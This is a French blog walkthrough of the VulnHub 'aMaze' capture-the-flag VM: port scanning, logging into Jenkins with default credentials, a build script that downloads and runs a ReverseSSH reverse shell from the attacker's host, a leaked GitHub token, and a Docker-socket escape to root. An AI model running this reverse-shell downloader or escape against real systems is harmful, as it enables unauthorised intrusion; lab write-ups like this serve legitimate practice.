# Solution du CTF aMaze de VulnHub

Thanks, but no thanks
---------------------

[aMaze](https://www.vulnhub.com/entry/amaze-1,573/) est (encore) un CTF que vous pouvez récupérer sur VulnHub.  

Il a été créé par *Swapneil Kumar Dash* et *Rajat Mittal (HasHeR)*.  

Ce challenge n'était pas assez compliqué pour être un labyrinthe (*a maze*) ni famuleux (*amazing*), la faute à une partie qui est du pure guessing et pourrit tout le plaisir que l'on aurait pu avoir sur ce CTF.  

Il y a malheureusement trop de CTF de ce type sur VulnHub et après plus de 115 writeups de CTF je pense être qualifié pour en parler :D  

```plain
$ sudo nmap -sCV -T5 -p- 192.168.56.13
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-26 18:23 CET
Nmap scan report for 192.168.56.13
Host is up (0.00019s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.56.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 c6:ec:1b:db:32:8a:00:7d:2a:1f:0c:5c:db:33:94:20 (RSA)
|   256 9a:fb:b6:6c:64:36:d4:17:8a:7b:00:71:75:e8:b8:be (ECDSA)
|_  256 fa:97:5f:1b:a4:69:3b:07:56:75:1d:78:a2:f1:82:5f (ED25519)
80/tcp   open  http    Apache httpd 2.4.38
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.38 (Debian)
8000/tcp open  http    Jetty 9.2.z-SNAPSHOT
|_http-title: Site doesn't have a title (text/html;charset=UTF-8).
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.2.z-SNAPSHOT)
```

Je commence par vérifier les trucs simples comme le serveur vsFTPd dont la version n'est pas connue pour être vulnérable.  

On ne trouve aucun fichier sur ce serveur qui autorise une connexion anonyme sans possibilité d'y déposer un fichier.  

Sur le port 80 on trouve après énumération deux fichiers PHP, login et logout qui ne semblent pas vulnérables.  

Un bruteforce ne vous ménera nul part à part rendre la VM inutilisable puisque comme souvent les auteurs du CTF n'ont pas pensé à désactiver les logs qui peuvent occuper la totalité de l'espace disque.  

Finalement sur le port 8000 on trouve une installation de Jenkins. Cette application web était déjà à l'honneur [sur le CTF Jeeves de HackTheBox](http://devloop.users.sourceforge.net/index.php?article163/solution-du-ctf-jeeves-de-hackthebox). Je vous renvoit à ce writeup si vous souhaitez avoir quelques images.  

J'ai testé manuellement quelques identifiants et je suis parvenu à me connecter avec *jenkins* / *jenkins*.  

Après il faut créer un nouveau projet et dans la section *Build* ajouter une étape de type *Exécuter un script shell*.  

J'avais balancé une simple commande pour exfiltrer l'UID utilisateur et Jenkins n'a pas apprécié le format :  

```plain
Started by user jenkins
Building in workspace /var/jenkins_home/workspace/yolo
[yolo] $ /bin/sh -xe /tmp/jenkins7189002743414529836.sh
FATAL: command execution failed
java.io.IOException: error=2, No such file or directory
	at java.lang.UNIXProcess.forkAndExec(Native Method)
	at java.lang.UNIXProcess.<init>(UNIXProcess.java:247)
	at java.lang.ProcessImpl.start(ProcessImpl.java:134)
	at java.lang.ProcessBuilder.start(ProcessBuilder.java:1029)
Caused: java.io.IOException: Cannot run program "/bin/sh" (in directory "/var/jenkins_home/workspace/yolo"): error=2, No such file or directory
	at java.lang.ProcessBuilder.start(ProcessBuilder.java:1048)
	at hudson.Proc$LocalProc.<init>(Proc.java:245)
	at hudson.Proc$LocalProc.<init>(Proc.java:214)
	at hudson.Launcher$LocalLauncher.launch(Launcher.java:850)
	at hudson.Launcher$ProcStarter.start(Launcher.java:384)
	at hudson.tasks.CommandInterpreter.perform(CommandInterpreter.java:109)
	at hudson.tasks.CommandInterpreter.perform(CommandInterpreter.java:66)
	at hudson.tasks.BuildStepMonitor$1.perform(BuildStepMonitor.java:20)
	at hudson.model.AbstractBuild$AbstractBuildExecution.perform(AbstractBuild.java:735)
	at hudson.model.Build$BuildExecution.build(Build.java:206)
	at hudson.model.Build$BuildExecution.doRun(Build.java:163)
	at hudson.model.AbstractBuild$AbstractBuildExecution.run(AbstractBuild.java:490)
	at hudson.model.Run.execute(Run.java:1735)
	at hudson.model.FreeStyleBuild.run(FreeStyleBuild.java:43)
	at hudson.model.ResourceController.execute(ResourceController.java:97)
	at hudson.model.Executor.run(Executor.java:405)
Build step 'Execute shell' marked build as failure
Finished: FAILURE
```

Le logiciel s'attend à voir un script avec le shebang en première ligne. J'ai opté une nouvelle fois pour ReverseSSH :  

```bash
#!/bin/bash
wget "http://192.168.56.1:8000/reverse-sshx64" -O /tmp/reverse-sshx64
chmod 755 /tmp/reverse-sshx64
/tmp/reverse-sshx64 -v -p 2244 192.168.56.1
```

Une fois connecté on remarque que l'on est dans un Docker (sans quoi ce serait déjà terminé) :  

```plain
root@7b5f8aa938da:/var/jenkins_home/workspace/yolo# id
uid=0(root) gid=0(root) groups=0(root)
root@7b5f8aa938da:/var/jenkins_home/workspace/yolo# ls -a /
.  ..  .dockerenv  bin  boot  dev  docker-java-home  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
```

This is not the way
-------------------

En listant les fichier dans */root* je remarque un dossier *.git* comme quoi le dossier est versionné.  

On peut utiliser les commandes Git pour en savoir plus...  

```plain
root@7b5f8aa938da:/root# git log 
commit e7045388b6b30739fd29f577903ab778502c4895
Author: swapneil <swapneil.dash2@gmail.com>
Date:   Tue Jan 28 15:43:53 2020 +0000

    Finally deleted the sensitive data from my box

commit 471a632ca787f2c70e795185050f4da9f2a39432
Author: swapneil <swapneil.dash2@gmail.com>
Date:   Tue Jan 28 15:43:08 2020 +0000

    this is an intersting commit

root@7b5f8aa938da:/root# git show e7045388b6b30739fd29f577903ab778502c4895
commit e7045388b6b30739fd29f577903ab778502c4895
Author: swapneil <swapneil.dash2@gmail.com>
Date:   Tue Jan 28 15:43:53 2020 +0000

    Finally deleted the sensitive data from my box

diff --git a/Git?Scope? b/Git?Scope?
deleted file mode 100644
index eafd2fc..0000000
--- a/Git?Scope?
+++ /dev/null
@@ -1,2 +0,0 @@
-I need to delete this token, so no one can access it!
-512fb73b2108f9c882fe3ff559ef4bc9496f4dc2
```

Ok, on a un token mais pour quoi ? J'ai tenté de le passer dans le formulaire du *login.php* en POST, en GET, via les entêtes, etc, rien à en tirer !  

De plus le répo ne dispose d'aucun remote associé (*git remote -v*).  

J'ai du chercher une solution sur le web et finalement il fallait utiliser le token sur Github (qui n'était mentionné nul part). J'ai beau déjà avoir utilisé l'API de Github la solution ne me saurait pas venue naturelement à l'esprit.  

On peut obtenir des infos sur le compte lié au token avec la requête suivante :  

```bash
curl -H 'Authorization: token 512fb73b2108f9c882fe3ff559ef4bc9496f4dc2' https://api.github.com/user
```

Ce qui nous amène à [ce profil Github](https://github.com/HaasHeR) sur lequel se trouve une URL pastebin dans la bio et le paste contient une clé privée SSH.  

Vu les méthodes employées par l'administrateur de Pastebin ces dernières années je serais plutôt inquiet si je devais créer un CTF dont la résolution requiert absolument un paste chez eux, ce ne serait pas la première fois qu'un paste normalement conservé à vie se fait éjecter...  

Heureusement celui-ci est encore présent. La clé ne nous permet cependant pas de nous connecter sur l'IP externe du CTF. On va donc fouiller un peu dans le réseau Docker.  

```plain
root@7b5f8aa938da:/tmp# ./nmap -sP -T5 172.17.0.3/16

Starting Nmap 7.11 ( https://nmap.org ) at 2021-12-26 17:54 UTC
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.17.0.1
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.000041s latency).
MAC Address: 02:42:15:88:1B:A0 (Unknown)
Nmap scan report for 172.17.0.2
Host is up (0.000036s latency).
MAC Address: 02:42:AC:11:00:02 (Unknown)
Nmap scan report for 7b5f8aa938da (172.17.0.3)
Host is up.
```

L'IP 172.17.0.1 semble correspondre en tout point à l'hôte :  

```plain
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  unknown
MAC Address: 02:42:15:88:1B:A0 (Unknown)
```

Sur l'IP 172.17.0.2 en revanche il n'y a qu'un port SSH :  

```plain
22/tcp open  ssh
```

Escalade Alpine
---------------

La clé fonctionne pour ce guest et on trouve dans le dossier de *root* le binaire *docker*.  

Toutefois la configuration par défaut ne semble pas fonctionner car le socket a été placé à un autre endroit. On peut corriger cela par une simple option.  

```plain
root@a97495c67b7e:~/docker# ./docker images ls
Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?

root@a97495c67b7e:~/docker# find / -name docker.sock
/tmp/docker.sock

root@a97495c67b7e:~/docker# ./docker -H unix:///tmp/docker.sock images ls -a
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
```

Le ménage a été fait dans les images présentes. Si on veut utiliser la technique classique de création d'un container avec le montage du système de fichier hôte il faut d'abord créer puis rappatrier une image.  

```bash
$ docker pull alpine:latest
latest: Pulling from library/alpine
Digest: sha256:21a3deaa0d32a8057914f36584b5288d2e5ecc984380bc0118285c70fa8c9300
Status: Image is up to date for alpine:latest
docker.io/library/alpine:latest
$ docker save alpine > alpine.tar
```

J'envoie l'archive vers le premier hôte via sftp sur le tunnel *ReverseSSH* puis de là le copie avec scp sur le second Docker.  

```plain
root@a97495c67b7e:~/docker# ./docker -H unix:///tmp/docker.sock load -i /tmp/alpine.tar 
8d3ac3489996: Loading layer [==================================================>]  5.866MB/5.866MB
Loaded image: alpine:latest

root@a97495c67b7e:~/docker# ./docker -H unix:///tmp/docker.sock run -v /:/mnt/fs -it alpine:latest /bin/sh
/ # cd /mnt/fs
/mnt/fs # cd root
/mnt/fs/root # ls
root.txt
/mnt/fs/root # cat root.txt 
676d6015094f9ec56284538b48537902
```

On peut aussi récupérer la clé privée de l'utilisateur *root* et enfin avoir une connexion sur l'hôte.  

```plain
$ ssh -i real_amaze.key root@192.168.56.14
Linux aMaze 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jan 28 22:58:37 2020 from 192.168.0.104
root@aMaze:~#
```

Sous le capot
-------------

Sous le capot c'est plutôt brouillon. On retrouve les dockers avec un qui a du servir de test.  

```plain
root@aMaze:~# docker ps -a
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                       PORTS                               NAMES
22a4dfc5c4ce        alpine:latest       "/bin/sh"                2 minutes ago       Up 2 minutes                                                     wizardly_antonelli
56c50cd29c43        alpine:latest       "/bin/sh"                8 minutes ago       Exited (0) 3 minutes ago                                         wonderful_lumiere
6a7c97992ec7        alpine:latest       "/bin/bash"              8 minutes ago       Created                                                          jolly_bardeen
a97495c67b7e        docker_2            "/bin/sh -c /start.sh"   29 minutes ago      Up 29 minutes                22/tcp                              ssh1
75e790c75269        docker_1            "/bin/tini -- /usr/l…"   29 minutes ago      Up 29 minutes                50000/tcp, 0.0.0.0:8000->8080/tcp   jenkins1
02fe58910e11        docker_2            "/bin/sh -c /start.sh"   23 months ago       Exited (137) 23 months ago                                       pwned
```

Bizarrement un mot de passe root se retrouve dans les logs.

```plain
root@aMaze:~# docker logs 02fe58910e11
root login password: Ohqu8aibeij9
/usr/lib/python2.7/dist-packages/supervisor/options.py:295: UserWarning: Supervisord is running as root and it is searching for its configuration file in default locations (including its current working directory); you probably want to specify a "-c" argument specifying an absolute path to a configuration file for improved security.
  'Supervisord is running as root and it is searching '
2020-01-28 17:34:18,445 CRIT Supervisor running as root (no user in config file)
2020-01-28 17:34:18,445 WARN Included extra file "/etc/supervisor/conf.d/sshd.conf" during parsing
2020-01-28 17:34:18,487 INFO RPC interface 'supervisor' initialized
2020-01-28 17:34:18,487 CRIT Server 'unix_http_server' running without any HTTP authentication checking
2020-01-28 17:34:18,488 INFO supervisord started with pid 11
2020-01-28 17:34:19,490 INFO spawned: 'sshd' with pid 14
2020-01-28 17:34:20,492 INFO success: sshd entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
```

On a ensuite le mystère de ce port 80... Je ne risquais pas d'y trouver quelque chose :  

```plain
root@aMaze:/var/www/html1# ls -l
total 16
-rw-r--r-- 1 root root  697 Jan 21  2020 _Is1There2Some3Issue4With5This6File7_.php
-rw-r--r-- 1 root root 3256 Jan 17  2020 login.php
-rw-r--r-- 1 root root  205 Jan 14  2020 logout.php
-rw-r--r-- 1 root root  176 Jan 14  2020 _MaybeYouFoundTheIssue_.php
```

Sans doute quelque chose que les auteurs ont essayé de faire fonctionner sans succès mais ont oublié de retirer (comme le serveur FTP).  

Idem pour la page de login... Indevinable.  

```php
if ($_POST['username'] == 'IamTheAdmin' &&
    $_POST['password'] == 'DoNotTryToBruteForce') {
    $_SESSION['valid'] = true;
    $_SESSION['timeout'] = time();
    $_SESSION['username'] = 'hackerpoint';

    echo 'You have entered valid use name and password';

    header("Location: _Is1There2Some3Issue4With5This6File7_.php");
    exit;
}else {
    $msg = 'Wrong username or password';
}
```

Quand au token Github, est-til bien protégé ? Heureusement oui, si on récupère les entêtes lors d'une requête sur l'API on voit que le scope associé est en lecture uniquement :  

```plain
x-oauth-scopes: read:user
```

That's about it!  


*Published December 27 2021 at 12:04*